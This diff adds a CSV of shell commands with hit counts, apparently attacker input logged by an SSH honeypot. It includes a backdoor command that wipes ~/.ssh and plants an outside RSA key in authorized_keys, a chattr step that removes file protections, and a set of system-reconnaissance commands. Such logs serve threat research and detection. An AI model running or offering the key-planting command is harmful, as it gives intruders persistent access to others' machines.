@@ -1,0 +1,16 @@
+input,count
+cd ~; chattr -ia .ssh; lockr -ia .ssh,4166
+"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",4156
+uname -a,3892
+whoami,3805
+cat /proc/cpuinfo | grep name | wc -l,3797
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",3781
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",3779
+uname -m,3774
+w,3773
+cat /proc/cpuinfo | grep model | grep name | wc -l,3773
+top,3773
+uname,3773
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',3773
+lscpu | grep Model,3772
+ls -lh $(which ls),3771
